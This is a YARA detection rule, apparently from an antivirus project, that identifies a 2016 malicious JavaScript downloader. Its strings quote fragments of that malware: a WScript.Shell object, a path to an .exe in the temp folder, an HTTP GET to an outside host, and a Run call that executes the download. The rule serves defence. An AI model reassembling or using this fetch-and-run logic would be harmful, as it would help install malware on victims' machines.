rule sig_20160329_91ad2da57b3c6c764130dba804caf8f7 {
  meta:
    description = "datamaliciousorder - file 20160329_91ad2da57b3c6c764130dba804caf8f7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "67a402940503748f36c0d4a557d14c607a3c3e8da956d3011882c87d922230c0"

  strings:
    $s1  = "function hn() {return tI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fmyz0GGeR.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[I](Sn() * 11); if (AU[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function H(gu, Sh){yy = yy * 1; return gu - Sh;};" fullword ascii
    $s4  = "AU[ng](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s5  = "var tI = function Oj() {return WScript[RF](\"WScript.Shell\");}(), Hc = 11;" fullword ascii
    $s6  = "function Xk(){return \"\" + c;};" fullword ascii
    $s7  = "function bj() {return ((BT == true) && (BT == He)) ? 1 : yy;};" fullword ascii
    $s8  = "function q(Av){tI[\"Run\"](Av, yy, yy);};" fullword ascii
    $s9  = "function Z(Mb) {var KF = (1, 2, 3, 4, 5, Mb); return KF;};" fullword ascii
    $s10 = "var hH = new this[\"Date\"]();" fullword ascii
    $s11 = "function DA(){return RF;};" fullword ascii
    $s12 = "function Df()" fullword ascii
    $s13 = " while (kt){" fullword ascii
    $s14 = "function Sn(){return 22;};" fullword ascii
    $s15 = "return H(mF, W);" fullword ascii
    $s16 = "var x0 = false;" fullword ascii
    $s17 = "He = true; " fullword ascii
    $s18 = "var BT = false;" fullword ascii
    $s19 = "BT = true; " fullword ascii
    $s20 = "var He = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}